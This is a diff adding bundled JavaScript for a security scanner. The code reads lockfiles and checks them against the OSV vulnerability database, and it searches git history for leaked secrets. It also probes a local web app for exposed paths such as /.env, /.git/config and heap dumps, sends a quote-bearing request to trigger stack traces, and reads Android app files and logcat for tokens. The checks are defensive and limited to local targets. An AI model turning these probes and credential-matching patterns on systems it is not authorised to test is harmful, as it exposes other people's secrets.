+function lineStarts(text2) {
+  const starts = [0];
+  for (let i = 0; i < text2.length; i++) if (text2.charCodeAt(i) === 10) starts.push(i + 1);
+  return starts;
+}
+function lineOf(starts, index) {
+  let lo = 0;
+  let hi = starts.length - 1;
+  while (lo < hi) {
+    const mid = lo + hi + 1 >> 1;
+    if (starts[mid] <= index) lo = mid;
+    else hi = mid - 1;
+  }
+  return lo;
+}
+function ignored(text2, starts, line, id) {
+  for (const l of [line, line - 1]) {
+    if (l < 0) continue;
+    const s = text2.slice(starts[l], starts[l + 1] ?? text2.length);
+    const m = IGNORE.exec(s);
+    if (m && m[1].split(/\s*,\s*/).some((x) => x === id || id.startsWith(x))) return true;
+  }
+  return false;
+}
+
+// src/security/deps.ts
+function readDependencies(root, files) {
+  const deps = [];
+  const unpinned = [];
+  const add = (ecosystem, name, version2, file) => {
+    const v = version2?.trim().replace(/^[v=]/, "");
+    if (name && v && /^\d/.test(v)) deps.push({ ecosystem, name, version: v, file });
+  };
+  for (const file of files) {
+    const base = file.split("/").pop();
+    const reader = READERS[base] ?? (/\.versions\.toml$/.test(base) ? READERS["libs.versions.toml"] : /\.csproj$/.test(base) ? READERS[".csproj"] : void 0);
+    if (!reader) continue;
+    const text2 = readText((0, import_node_path37.join)(root, file));
+    if (text2 === null) continue;
+    try {
+      reader(text2, (e, n, v) => add(e, n, v, file), file, unpinned);
+    } catch {
+    }
+  }
+  return { deps: uniq(deps), unpinned };
+}
+var READERS = {
+  "package-lock.json": (text2, add) => {
+    const lock = JSON.parse(text2);
+    for (const [path, p] of Object.entries(lock.packages ?? {})) if (path) add("npm", path.slice(path.lastIndexOf("node_modules/") + 13), p.version);
+    if (!lock.packages) for (const [name, p] of Object.entries(lock.dependencies ?? {})) add("npm", name, p.version);
+  },
+  "yarn.lock": (text2, add) => {
+    for (const block of text2.split(/\n(?=\S)/)) {
+      const head = /^"?(@?[^@\s"]+)@/.exec(block);
+      const version2 = /\n\s+version:?\s+"?([^"\s]+)"?/.exec(block);
+      if (head && version2) add("npm", head[1], version2[1]);
+    }
+  },
+  "pnpm-lock.yaml": (text2, add) => {
+    const lock = (0, import_yaml8.parse)(text2);
+    for (const key of Object.keys(lock.packages ?? {})) {
+      const m = /^\/?(@?[^@(]+)@([^(]+)/.exec(key) ?? /^\/(@?[^/]+(?:\/[^/]+)?)\/([^/(]+)/.exec(key);
+      if (m) add("npm", m[1], m[2]);
+    }
+  },
+  "requirements.txt": (text2, add) => {
+    for (const line of text2.split("\n")) {
+      const m = /^\s*([A-Za-z0-9_.-]+)(\[[^\]]*\])?\s*==\s*([\w.]+)/.exec(line);
+      if (m) add("PyPI", m[1], m[3]);
+    }
+  },
+  "poetry.lock": (text2, add) => tomlPackages(text2, (n, v) => add("PyPI", n, v)),
+  "uv.lock": (text2, add) => tomlPackages(text2, (n, v) => add("PyPI", n, v)),
+  "Pipfile.lock": (text2, add) => {
+    const lock = JSON.parse(text2);
+    for (const section of ["default", "develop"]) for (const [n, p] of Object.entries(lock[section] ?? {})) add("PyPI", n, p.version?.replace(/^==/, ""));
+  },
+  "Cargo.lock": (text2, add) => tomlPackages(text2, (n, v) => add("crates.io", n, v)),
+  "go.sum": (text2, add) => {
+    for (const line of text2.split("\n")) {
+      const m = /^(\S+)\s+v([^\s/]+?)(\/go\.mod)?\s/.exec(line);
+      if (m && !m[3]) add("Go", m[1], m[2]);
+    }
+  },
+  "Gemfile.lock": (text2, add) => {
+    const specs = /^ {4}([\w.-]+) \(([\w.]+)\)$/gm;
+    let m;
+    while (m = specs.exec(text2)) add("RubyGems", m[1], m[2]);
+  },
+  "composer.lock": (text2, add) => {
+    const lock = JSON.parse(text2);
+    for (const p of [...lock.packages ?? [], ...lock["packages-dev"] ?? []]) add("Packagist", p.name, p.version);
+  },
+  "pubspec.lock": (text2, add) => {
+    const lock = (0, import_yaml8.parse)(text2);
+    for (const [n, p] of Object.entries(lock.packages ?? {})) if (p.source !== "sdk") add("Pub", n, p.version);
+  },
+  "Podfile.lock": (text2, add) => {
+    const re = /^ {2}- ([\w+/-]+) \(([\w.]+)\)/gm;
+    let m;
+    while (m = re.exec(text2)) add("CocoaPods", m[1].split("/")[0], m[2]);
+  },
+  "Package.resolved": (text2, add) => {
+    const lock = JSON.parse(text2);
+    for (const p of lock.pins ?? lock.object?.pins ?? []) add("SwiftURL", (p.location ?? p.repositoryURL ?? "").replace(/\.git$/, ""), p.state?.version);
+  },
+  "gradle.lockfile": (text2, add) => {
+    for (const line of text2.split("\n")) {
+      const m = /^([\w.-]+):([\w.-]+):([\w.-]+)=/.exec(line);
+      if (m) add("Maven", `${m[1]}:${m[2]}`, m[3]);
+    }
+  },
+  "libs.versions.toml": (text2, add, file, unpinned) => {
+    const versions = /* @__PURE__ */ new Map();
+    const section = (name) => new RegExp(`^\\[${name}\\]([\\s\\S]*?)(?=^\\[|$(?![\\s\\S]))`, "m").exec(text2)?.[1] ?? "";
+    for (const m of section("versions").matchAll(/^\s*([\w-]+)\s*=\s*"([^"]+)"/gm)) versions.set(m[1], m[2]);
+    for (const line of section("libraries").split("\n")) {
+      const module2 = /module\s*=\s*"([^"]+)"/.exec(line)?.[1] ?? /group\s*=\s*"([^"]+)"[^}]*name\s*=\s*"([^"]+)"/.exec(line)?.slice(1, 3).join(":");
+      const direct = /version\s*=\s*"([^"]+)"/.exec(line)?.[1];
+      const ref = /version\.ref\s*=\s*"([^"]+)"/.exec(line)?.[1];
+      const short2 = /^\s*[\w-]+\s*=\s*"([\w.-]+:[\w.-]+):([^"]+)"/.exec(line);
+      const name = module2 ?? short2?.[1];
+      const version2 = direct ?? (ref ? versions.get(ref) : void 0) ?? short2?.[2];
+      if (!name) continue;
+      if (version2 && /[+]|latest\.|SNAPSHOT/i.test(version2)) unpinned.push(unpinnedFinding(file, name, version2));
+      add("Maven", name, version2);
+    }
+  },
+  "pom.xml": (text2, add) => {
+    const props = /* @__PURE__ */ new Map();
+    for (const m of text2.matchAll(/<([\w.-]+)>([^<${}]+)<\/\1>/g)) props.set(m[1], m[2]);
+    for (const m of text2.matchAll(/<dependency>\s*<groupId>([^<]+)<\/groupId>\s*<artifactId>([^<]+)<\/artifactId>\s*<version>([^<]+)<\/version>/g)) {
+      const v = m[3].replace(/\$\{([^}]+)\}/, (_, k) => props.get(k) ?? "");
+      add("Maven", `${m[1]}:${m[2]}`, v);
+    }
+  },
+  ".csproj": (text2, add) => {
+    for (const m of text2.matchAll(/<PackageReference\s+Include="([^"]+)"\s+Version="([^"]+)"/g)) add("NuGet", m[1], m[2]);
+  },
+  "package.json": (text2, add, file, unpinned) => {
+    const pkg = JSON.parse(text2);
+    for (const key of ["dependencies", "devDependencies"]) {
+      for (const [n, v] of Object.entries(pkg[key] ?? {})) if (v === "*" || v === "latest" || /^(git|github|https?):/.test(v)) unpinned.push(unpinnedFinding(file, n, v));
+    }
+  }
+};
+function tomlPackages(text2, add) {
+  for (const block of text2.split(/^\[\[package\]\]\s*$/m).slice(1)) {
+    const name = /^name\s*=\s*"([^"]+)"/m.exec(block)?.[1];
+    const version2 = /^version\s*=\s*"([^"]+)"/m.exec(block)?.[1];
+    if (name && version2) add(name, version2);
+  }
+}
+function unpinnedFinding(file, name, version2) {
+  return makeFinding({
+    check: "COM-DEP-04",
+    title: `Floating dependency version: ${name}@${version2}`,
+    severity: "medium",
+    layer: "deps",
+    file,
+    evidence: `${name} ${version2}`,
+    why: "Each build can pull a different (possibly compromised) version without review.",
+    fix: "Pin an exact version and update it deliberately (Renovate/Dependabot).",
+    refs: ["CWE-829"],
+    feature: "project"
+  });
+}
+function uniq(deps) {
+  const seen = /* @__PURE__ */ new Map();
+  for (const d of deps) seen.set(`${d.ecosystem}|${d.name}|${d.version}`, d);
+  return [...seen.values()];
+}
+var OSV = "https://api.osv.dev/v1";
+async function osvFindings(deps, owner, log) {
+  const out = [];
+  const details = /* @__PURE__ */ new Map();
+  for (let i = 0; i < deps.length; i += 500) {
+    const chunk = deps.slice(i, i + 500);
+    const res = await fetchJson(`${OSV}/querybatch`, {
+      queries: chunk.map((d) => ({ package: { name: d.name, ecosystem: d.ecosystem }, version: d.version }))
+    });
+    res.results.forEach((r, n) => {
+      const dep = chunk[n];
+      for (const v of r.vulns ?? []) {
+        details.set(v.id, null);
+        out.push(osvPlaceholder(dep, v.id, owner(dep.file)));
+      }
+    });
+  }
+  if (out.length) log(`  ${out.length} known vulnerabilit${out.length === 1 ? "y" : "ies"} in ${new Set(out.map((f) => f.evidence.split(" ")[0])).size} package(s)`);
+  for (const id of [...details.keys()].slice(0, 150)) details.set(id, await fetchJson(`${OSV}/vulns/${encodeURIComponent(id)}`).catch(() => null));
+  return out.map((f) => {
+    const v = details.get(f.refs[1]);
+    if (!v) return f;
+    const [pkg] = f.evidence.split(" ");
+    const fixed = v.affected?.find((a) => a.package?.name === pkg)?.ranges?.flatMap((r) => r.events ?? []).find((e) => e.fixed)?.fixed;
+    const cve = v.aliases?.find((a) => a.startsWith("CVE-"));
+    return makeFinding({
+      ...f,
+      title: `${pkg}: ${(v.summary ?? v.details ?? v.id).split("\n")[0].slice(0, 120)}`,
+      severity: osvSeverity(v),
+      why: `${v.id}${cve ? ` (${cve})` : ""}: ${(v.summary ?? v.details ?? "known vulnerability").slice(0, 300)}`,
+      fix: fixed ? `Upgrade ${pkg} to ${fixed} or later, then rebuild and run the tests.` : `No fixed version listed for ${pkg}: check ${v.id}, upgrade when a fix ships, or replace the package.`,
+      refs: ["CWE-1104", v.id, ...cve ? [cve] : []]
+    });
+  });
+}
+function osvPlaceholder(dep, id, feature) {
+  return makeFinding({
+    check: "COM-DEP-01",
+    title: `${dep.name}@${dep.version}: ${id}`,
+    severity: "medium",
+    layer: "deps",
+    file: dep.file,
+    evidence: `${dep.name} ${dep.version} (${dep.ecosystem}) ${id}`,
+    why: `Known vulnerability ${id}.`,
+    fix: `Upgrade ${dep.name}.`,
+    refs: ["CWE-1104", id],
+    feature
+  });
+}
+function osvSeverity(v) {
+  const label = v.database_specific?.severity?.toLowerCase();
+  if (label === "critical" || label === "high" || label === "low") return label;
+  if (label === "moderate" || label === "medium") return "medium";
+  const score = v.severity?.map((s) => cvssScore(s.score)).find((n) => n !== null);
+  if (score === void 0 || score === null) return "medium";
+  return score >= 9 ? "critical" : score >= 7 ? "high" : score >= 4 ? "medium" : "low";
+}
+function cvssScore(vector) {
+  const n = Number(vector);
+  if (!Number.isNaN(n)) return n;
+  if (!/^CVSS:/.test(vector)) return null;
+  const high = (vector.match(/\/(C|I|A|VC|VI|VA):H/g) ?? []).length;
+  const network = /AV:N/.test(vector);
+  const noAuth = /PR:N/.test(vector);
+  return high >= 2 && network && noAuth ? 9.1 : high >= 1 && network ? 7.5 : high >= 1 ? 6 : 4;
+}
+async function fetchJson(url, body) {
+  const res = await fetch(url, body ? { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(body), signal: AbortSignal.timeout(3e4) } : { signal: AbortSignal.timeout(3e4) });
+  if (!res.ok) throw new Error(`${url}: HTTP ${res.status}`);
+  return await res.json();
+}
+
+// src/security/history.ts
+var import_node_child_process7 = require("node:child_process");
+function historyFindings(root, rules, commits, owner) {
+  const secretRules = rules.filter((r) => r.secret && r.match && !r.absent && !r.fileOnly && !r.when && r.platform === "common");
+  const keyFiles = rules.filter((r) => r.fileOnly && r.id === "COM-SEC-02");
+  if (!secretRules.length || commits <= 0) return [];
+  const git2 = (0, import_node_child_process7.spawnSync)("git", ["log", "--all", `--max-count=${commits}`, "-p", "-U0", "--no-color", "--no-ext-diff", "--diff-filter=AM", "--format=@@@commit %h %ad", "--date=short"], {
+    cwd: root,
+    encoding: "utf8",
+    windowsHide: true,
+    maxBuffer: 512 * 1024 * 1024,
+    timeout: 12e4
+  });
+  if (git2.error || git2.status !== 0) return [];
+  const out = [];
+  let commit = "";
+  let file = "";
+  for (const line of git2.stdout.split("\n")) {
+    if (line.startsWith("@@@commit ")) {
+      commit = line.slice(10).trim();
+      continue;
+    }
+    if (line.startsWith("+++ b/")) {
+      file = line.slice(6);
+      if (keyFiles.some((r) => r.files.test(file))) out.push(found(keyFiles[0], file, commit, file, owner(file)));
+      continue;
+    }
+    if (!line.startsWith("+") || line.startsWith("+++") || line.length > 2e3) continue;
+    for (const r of secretRules) {
+      if (!r.files.test(file)) continue;
+      const m = r.match.exec(line);
+      if (m && !(r.unless && r.unless.test(line))) out.push(found(r, file, commit, m[0], owner(file)));
+    }
+  }
+  return out;
+}
+function found(r, file, commit, evidence, feature) {
+  const shown = r.fileOnly ? evidence : mask(evidence);
+  const f = makeFinding({
+    check: r.id === "COM-SEC-02" && r.fileOnly ? "COM-SEC-05" : r.id,
+    title: `${r.title} (in git history)`,
+    severity: r.severity === "critical" ? "high" : r.severity,
+    layer: "history",
+    file,
+    evidence: shown,
+    why: `${r.why} It is in commit ${commit.split(" ")[0]}, so every clone of the repository still has it, even if the current code no longer does.`,
+    fix: "Rotate the secret first (that is what actually protects you), then purge it from history with git filter-repo or BFG and force-push, and ask collaborators to re-clone.",
+    refs: [...r.refs, "COM-SEC-05"],
+    feature
+  });
+  return { ...f, evidence: `${shown} \xB7 commit ${commit}` };
+}
+
+// src/security/runtime.ts
+function isLocalUrl(url) {
+  try {
+    const host = new URL(url).hostname;
+    return host === "localhost" || host === "127.0.0.1" || host === "[::1]" || host === "::1" || host.endsWith(".localhost") || host.endsWith(".test");
+  } catch {
+    return false;
+  }
+}
+function found2(check2, severity, evidence, title, why, fix, refs, file) {
+  return makeFinding({ check: check2, title, severity, layer: "runtime", file, evidence, why, fix, refs, feature: "project" });
+}
+async function webRuntimeFindings(url, log) {
+  if (!isLocalUrl(url)) throw new Error(`security.url must be a local address (localhost, 127.0.0.1, *.localhost, *.test); got ${url}.`);
+  const out = [];
+  const base = url.replace(/\/$/, "");
+  const res = await get(base);
+  if (!res) {
+    log(`  ${base} did not answer: start the app, or unset security.url`);
+    return out;
+  }
+  const h = res.headers;
+  const html = (h.get("content-type") ?? "").includes("text/html");
+  if (html) {
+    const csp = h.get("content-security-policy");
+    if (!csp) out.push(found2("WEB-HDR-01", "medium", `GET ${base} \u2192 no Content-Security-Policy`, "No Content-Security-Policy", "Without CSP, any XSS runs freely.", "Send a CSP that allows only your own scripts (nonces or hashes).", ["CWE-693"]));
+    else if (/script-src[^;]*('unsafe-inline'|'unsafe-eval'|\s\*)/.test(csp)) out.push(found2("WEB-HDR-01", "medium", `CSP: ${csp.slice(0, 200)}`, "Weak Content-Security-Policy", "unsafe-inline / unsafe-eval / * leaves XSS exploitable.", "Use nonces or hashes for scripts.", ["CWE-693"]));
+    if (!h.get("x-frame-options") && !/frame-ancestors/.test(csp ?? "")) out.push(found2("WEB-HDR-02", "medium", `GET ${base} \u2192 no X-Frame-Options or frame-ancestors`, "Page can be framed (clickjacking)", "Another site can load your page invisibly and trick users into clicking.", "Send Content-Security-Policy: frame-ancestors 'self' (or X-Frame-Options: DENY).", ["CWE-1021"]));
+    if (!h.get("referrer-policy")) out.push(found2("WEB-HDR-05", "low", `GET ${base} \u2192 no Referrer-Policy`, "No Referrer-Policy", "Full URLs (with any tokens in them) go to other sites in the Referer header.", "Send Referrer-Policy: strict-origin-when-cross-origin.", ["CWE-200"]));
+  }
+  if (!h.get("x-content-type-options")) out.push(found2("WEB-HDR-04", "low", `GET ${base} \u2192 no X-Content-Type-Options`, "MIME sniffing not disabled", "Browsers may run uploaded files as scripts.", "Send X-Content-Type-Options: nosniff.", []));
+  if (base.startsWith("https:") && !h.get("strict-transport-security")) out.push(found2("WEB-HDR-03", "low", `GET ${base} \u2192 no Strict-Transport-Security`, "No HSTS", "The first request can be downgraded to HTTP.", "Send Strict-Transport-Security: max-age=31536000; includeSubDomains.", ["CWE-319"]));
+  const powered = h.get("x-powered-by") ?? (/\d/.test(h.get("server") ?? "") ? h.get("server") : null);
+  if (powered) out.push(found2("API-LOG-01", "info", `${h.get("x-powered-by") ? "X-Powered-By" : "Server"}: ${powered}`, "Server software and version disclosed", "Version headers help attackers pick known exploits.", "Remove X-Powered-By (app.disable('x-powered-by')) and version numbers from Server.", ["CWE-200"]));
+  for (const cookie of setCookies(h)) {
+    const name = cookie.split("=")[0].trim();
+    if (!/sess|sid|token|auth|jwt|remember|login/i.test(name)) continue;
+    const missing = [!/;\s*httponly/i.test(cookie) && "HttpOnly", base.startsWith("https:") && !/;\s*secure/i.test(cookie) && "Secure", !/;\s*samesite=/i.test(cookie) && "SameSite"].filter(Boolean);
+    if (missing.length) out.push(found2("WEB-HDR-07", "medium", `Set-Cookie: ${name}=\u2026; missing ${missing.join(", ")}`, `Session cookie ${name} without ${missing.join(", ")}`, "Without HttpOnly scripts (XSS) can steal it; without Secure it goes over HTTP; without SameSite other sites can send it (CSRF).", "Set HttpOnly; Secure; SameSite=Lax on session cookies.", ["CWE-1004", "CWE-614"]));
+  }
+  const probeOrigin = "https://cors-check.probe.invalid";
+  const cors = await get(base, { origin: probeOrigin });
+  const acao = cors?.headers.get("access-control-allow-origin");
+  if (acao === probeOrigin || acao === "*" && cors?.headers.get("access-control-allow-credentials") === "true") {
+    out.push(found2("API-HTTP-01", cors?.headers.get("access-control-allow-credentials") === "true" ? "high" : "medium", `Origin: ${probeOrigin} \u2192 Access-Control-Allow-Origin: ${acao}${cors?.headers.get("access-control-allow-credentials") === "true" ? ", Allow-Credentials: true" : ""}`, "CORS trusts any origin", "Any website can call the app from a visitor's browser and read the answers (with their cookies when credentials are allowed).", "Allow only your own origins.", ["CWE-942"]));
+  }
+  const exposed = [
+    ["/.env", /^[A-Z_]+=.+/m, "COM-SEC-03", ".env served over HTTP", "critical"],
+    ["/.git/config", /\[core\]/, "COM-SEC-05", ".git folder served over HTTP", "high"],
+    ["/actuator/env", /"propertySources"|"activeProfiles"/, "API-LOG-04", "Spring actuator env exposed", "high"],
+    ["/actuator/heapdump", /JAVA PROFILE|HPROF/, "API-LOG-04", "Heap dump downloadable", "critical"],
+    ["/debug/pprof/", /Types of profiles available|goroutine/, "API-LOG-04", "Go pprof exposed", "high"],
+    ["/phpinfo.php", /phpinfo\(\)|PHP Version/, "API-LOG-04", "phpinfo exposed", "high"],
+    ["/server-status", /Apache Server Status/, "API-LOG-04", "Apache server-status exposed", "medium"],
+    ["/__debug__/", /djdt|Django Debug Toolbar/, "API-LOG-01", "Django debug toolbar exposed", "high"]
+  ];
+  for (const [path, signature, check2, title, severity] of exposed) {
+    const r = await get(`${base}${path}`);
+    if (r && r.status === 200 && signature.test(r.body.slice(0, 2e4))) out.push(found2(check2, severity, `GET ${path} \u2192 200`, title, "This path leaks configuration, secrets or memory to anyone who asks.", "Block the path (or the tool) in the deployed app; serve only what users need.", ["CWE-200"]));
+  }
+  const gql = await post(`${base}/graphql`, { query: "{__schema{queryType{name}}}" });
+  if (gql && gql.status === 200 && /"__schema"/.test(gql.body)) out.push(found2("API-RES-04", "low", "POST /graphql {__schema} \u2192 200", "GraphQL introspection enabled", "Introspection gives attackers the full schema, including admin fields.", "Disable introspection in production.", ["API9"]));
+  const bad = await get(`${base}/%ff%fe/probe-${Date.now()}?id='"`);
+  if (bad && /(at\s+[\w.$]+\s*\([^)]*:\d+:\d+\)|Traceback \(most recent call last\)|\.java:\d+\)|Exception in thread|<b>Warning<\/b>:.*on line)/.test(bad.body)) out.push(found2("API-LOG-01", "medium", `GET ${new URL(bad.url).pathname} \u2192 stack trace in the response`, "Stack trace shown on errors", "Traces reveal file paths, libraries and queries.", "Return a generic error page and log details server-side.", ["CWE-209"]));
+  return out;
+}
+async function get(url, headers = {}) {
+  try {
+    const res = await fetch(url, { headers, redirect: "manual", signal: AbortSignal.timeout(1e4) });
+    return { status: res.status, headers: res.headers, body: await res.text().catch(() => ""), url };
+  } catch {
+    return null;
+  }
+}
+async function post(url, body) {
+  try {
+    const res = await fetch(url, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(body), signal: AbortSignal.timeout(1e4) });
+    return { status: res.status, body: await res.text().catch(() => "") };
+  } catch {
+    return null;
+  }
+}
+function setCookies(h) {
+  const all = h.getSetCookie?.();
+  if (all) return all;
+  const one = h.get("set-cookie");
+  return one ? one.split(/,(?=\s*\w+=)/) : [];
+}
+function androidRuntimeFindings(project, pkg, rules, log) {
+  const adb = Adb.forProject(project.root);
+  const devices = listDevices(adb).filter((d) => d.emulator || project.config.devices.allowReal.includes(d.serial));
+  if (!devices.length) {
+    log("  no emulator running (real phones need devices.allowReal): skipped the device checks");
+    return [];
+  }
+  const serial = devices[0].serial;
+  const sh = (cmd) => adb.run(["-s", serial, "shell", cmd], 3e4);
+  const dump = sh(`dumpsys package ${shQuote(pkg)}`);
+  if (!dump.ok || !dump.out.includes(`Package [${pkg}]`)) {
+    log(`  ${pkg} is not installed on ${serial}: skipped the device checks`);
+    return [];
+  }
+  log(`  device ${serial}, package ${pkg}`);
+  const out = [];
+  const flags = /pkgFlags=\[([^\]]*)\]/.exec(dump.out)?.[1] ?? /flags=\[([^\]]*)\]/.exec(dump.out)?.[1] ?? "";
+  const debuggable = /\bDEBUGGABLE\b/.test(flags);
+  if (debuggable) out.push(found2("AND-MAN-01", "info", `${pkg} flags: ${flags.trim()}`, "Installed build is debuggable", "Fine for a debug build; a release build must never be (run-as reads all private data).", "Check this on the release build: it must not show DEBUGGABLE.", ["CWE-215"]));
+  if (/\bALLOW_BACKUP\b/.test(flags)) out.push(found2("AND-MAN-02", "medium", `${pkg} flags include ALLOW_BACKUP`, "App data can be backed up", "adb backup and cloud backup copy tokens and databases off the device.", "Set allowBackup=false or exclude secrets with dataExtractionRules.", ["CWE-530"]));
+  const secretRules = rules.filter((r) => r.secret && r.match && !r.when && r.platform === "common");
+  const pid = sh(`pidof ${shQuote(pkg)}`).out.trim().split(/\s+/)[0];
+  const logcat = adb.run(["-s", serial, "logcat", "-d", "-v", "brief", ...pid ? ["--pid", pid] : [], "-t", "20000"], 3e4).out;
+  const jwt = /\beyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/;
+  const bearer = /\b(Authorization|Bearer|access_token|refresh_token|password)\b\s*[:=]?\s*\S{8,}/i;
+  const logged = logcat.split("\n").filter((l) => jwt.test(l) || bearer.test(l) || secretRules.some((r) => r.match.test(l))).slice(0, 5);
+  if (logged.length) out.push(found2("AND-LOG-04", "high", logged.map((l) => mask(l.slice(0, 160))).join(" | "), "Tokens or credentials in logcat", "Anything in logcat is readable over USB, in bug reports and by crash tools.", "Remove the logging (or redact it) and strip debug logs from release builds.", ["CWE-532", "MASTG-TEST-0003"]));
+  if (debuggable) {
+    const files = sh(`run-as ${shQuote(pkg)} sh -c 'ls shared_prefs/*.xml files/datastore/*.preferences_pb 2>/dev/null'`).out.split("\n").map((l) => l.trim()).filter(Boolean).slice(0, 40);
+    for (const file of files) {
+      const text2 = sh(`run-as ${shQuote(pkg)} cat ${shQuote(file)}`).out;
+      const hit = /(token|jwt|password|secret|session)[^<>"\n]{0,40}["'>=:]\s*([A-Za-z0-9._\-+/=]{16,})/i.exec(text2) ?? jwt.exec(text2);
+      if (hit && !/encrypted|__androidx_security_crypto/i.test(text2)) out.push(found2("AND-STO-10", "critical", `${file}: ${mask(hit[0].slice(0, 120))}`, "Token stored in a plain file on the device", "Backups, rooted devices and forensic tools read this file directly.", "Store tokens with EncryptedSharedPreferences / Tink with an Android Keystore key.", ["CWE-312", "MASTG-TEST-0001"], file));
+    }
+  }
+  return out;
+}
+
+// src/security/run.ts
+var ALL_LAYERS = ["static", "deps", "history", "artifact", "runtime", "agent"];
+function startSecurityRun(project, options = {}) {
+  const run = {
+    id: newRunId(),
+    kind: "security",
+    feature: options.feature ?? "*",
+    startedAt: (/* @__PURE__ */ new Date()).toISOString(),
+    status: "running",
+    platforms: [],
+    layers: [],
+    findings: [],
+    dismissed: 0,
+    files: 0,
+    costUsd: 0
+  };
+  return launchRun(project, run, async (log) => {
+    const cfg = project.config.security;
+    const wanted = new Set(options.layers ?? ALL_LAYERS.filter((l) => l !== "agent" || options.agent));
+    if (options.agent) wanted.add("agent");
+    const scan2 = latestScan(project);
+    const owner = featureOwner(project, scan2);
+    const feature = options.feature ? findFeature(scan2, options.feature) : void 0;
+    if (options.feature && !feature && options.feature !== "project") throw new Error(`Unknown feature ${options.feature}. Run probe scan to see the features.`);
+    const projectWide = !options.feature;
+    const allFiles = securityFiles(project);
+    const platforms = detectPlatforms(project.root, allFiles);
+    run.platforms = [...platforms].sort();
+    log(`platforms: ${run.platforms.join(", ") || "none detected (common checks only)"}`);
+    const rules = rulesFor(platforms);
+    const files = options.feature ? allFiles.filter((f) => owner(f) === (feature?.id ?? "project")) : allFiles;
+    const found3 = [];
+    const layer = async (name, work, skipWhy) => {
+      throwIfStopped();
+      if (!wanted.has(name)) return;
+      if (skipWhy) {
+        run.layers.push({ layer: name, status: "skipped", note: skipWhy });
+        log(`\u2500\u2500 ${name}: skipped (${skipWhy})`);
+        return;
+      }
+      log(`\u2500\u2500 ${name}`);
+      try {
+        const note = await work();
+        run.layers.push({ layer: name, status: "ran", note: note || void 0 });
+      } catch (e) {
+        run.layers.push({ layer: name, status: "error", note: e.message });
+        log(`  error: ${e.message}`);
+      }
+    };
+    await layer("static", () => {
+      const before = found3.length;
+      found3.push(...runStatic(project.root, files, rules, { owner, skip: cfg.skip }));
+      run.files = files.length;
+      log(`  ${rules.length} rules over ${files.length} files: ${found3.length - before} finding(s)`);
+      return `${rules.length} rules, ${files.length} files`;
+    });
+    await layer(
+      "deps",
+      async () => {
+        const { deps, unpinned } = readDependencies(project.root, allFiles);
+        found3.push(...unpinned.map((f) => ({ ...f, feature: owner(f.file ?? "") })));
+        log(`  ${deps.length} pinned dependencies from lockfiles`);
+        if (!cfg.osv) return `${deps.length} dependencies; OSV lookup off (security.osv)`;
+        if (!deps.length) return "no lockfile with exact versions";
+        found3.push(...await osvFindings(deps, owner, log));
+        return `${deps.length} dependencies checked against OSV`;
+      },
+      projectWide ? void 0 : "project-wide; run without a feature"
+    );
+    await layer(
+      "history",
+      () => {
+        const hits = historyFindings(project.root, rules, cfg.historyCommits, owner);
+        const inCode = new Set(found3.filter((f) => f.layer === "static").map((f) => `${f.check}|${f.file}`));
+        const fresh = hits.filter((f) => !inCode.has(`${f.check}|${f.file}`));
+        found3.push(...fresh);
+        log(`  last ${cfg.historyCommits} commits: ${fresh.length} secret(s) only in history`);
+        return `last ${cfg.historyCommits} commits`;
+      },
+      !projectWide ? "project-wide; run without a feature" : cfg.historyCommits <= 0 ? "security.historyCommits is 0" : !(0, import_node_fs28.existsSync)((0, import_node_path38.join)(project.root, ".git")) ? "not a git repository" : void 0
+    );
+    await layer(
+      "artifact",
+      () => {
+        const { findings, scanned } = artifactFindings(project.root, rules, owner);
+        found3.push(...findings);
+        log(scanned.length ? `  read ${scanned.join(", ")}` : "  no built app or web bundle on disk (build one to check what ships)");
+        return scanned.length ? scanned.join(", ") : "nothing built yet";
+      },
+      projectWide ? void 0 : "project-wide; run without a feature"
+    );
+    const url = options.url ?? cfg.url;
+    const pkg = platforms.has("android") ? safePackage(project) : void 0;
+    await layer(
+      "runtime",
+      async () => {
+        const notes = [];
+        if (url) {
+          found3.push(...await webRuntimeFindings(url, log));
+          notes.push(url);
+        }
+        if (pkg) {
+          found3.push(...androidRuntimeFindings(project, pkg, rules, log));
+          notes.push(pkg);
+        }
+        return notes.join(", ");
+      },
+      !projectWide ? "project-wide; run without a feature" : !url && !pkg ? "no security.url set and no Android app package found" : void 0
+    );
+    await layer("agent", async () => {
+      const targets = feature ? [feature] : scan2.features.slice().sort((a, b) => a.group === b.group ? b.stats.classes - a.stats.classes : a.group === "feature" ? -1 : 1).slice(0, options.agentLimit ?? 3);
+      for (const f of targets) {
+        throwIfStopped();
+        log(`  reviewing ${f.id}`);
+        const r = await agentFindings(project, f, platforms, found3, log, options.model);
+        run.costUsd += r.costUsd;
+        found3.push(...r.findings);
+        log(`  ${f.id}: ${r.findings.length} finding(s)${r.error ? ` (${r.error})` : ""}`);
+      }
+      return `${targets.map((t) => t.id).join(", ")}`;
+    });
+    const dismissed = new Set(loadDismissals(project).map((d) => d.fingerprint));
+    const all = dedupe(found3);
+    run.findings = sortFindings(all.filter((f) => !dismissed.has(f.fingerprint)));
+    run.dismissed = all.length - run.findings.length;
+    const counts = countBySeverity(run.findings);
+    log(`${run.findings.length} open finding(s): ${counts}${run.dismissed ? ` \xB7 ${run.dismissed} dismissed` : ""}`);
+    const failing = run.findings.filter((f) => severityRank(f.severity) <= severityRank(cfg.failOn));
+    run.status = failing.length ? "failed" : "passed";
+    if (failing.length) run.error = `${failing.length} finding(s) at ${cfg.failOn} or above.`;
+  });
+}
+function safePackage(project) {
+  try {
+    return resolveApp(project).package;
+  } catch {
+    return void 0;
+  }
+}
+function countBySeverity(list) {
+  const n = (s) => list.filter((f) => f.severity === s).length;
+  return ["critical", "high", "medium", "low", "info"].filter((s) => n(s)).map((s) => `${n(s)} ${s}`).join(", ") || "none";
+}
+function summarizeSecurity(run) {
+  const lines = [`Security ${run.id} \xB7 ${run.feature === "*" ? "whole project" : run.feature} \xB7 ${run.status.toUpperCase()} \xB7 ${run.findings.length} open (${countBySeverity(run.findings)})${run.dismissed ? ` \xB7 ${run.dismissed} dismissed` : ""}${run.costUsd ? ` \xB7 $${run.costUsd.toFixed(2)}` : ""}`];
+  lines.push(`  platforms: ${run.platforms.join(", ") || "\u2014"}`);
+  lines.push(`  layers: ${run.layers.map((l) => `${l.layer} ${l.status}${l.note && l.status !== "ran" ? ` (${l.note})` : ""}`).join(" \xB7 ")}`);
+  if (run.error && run.status === "error") lines.push(run.error);
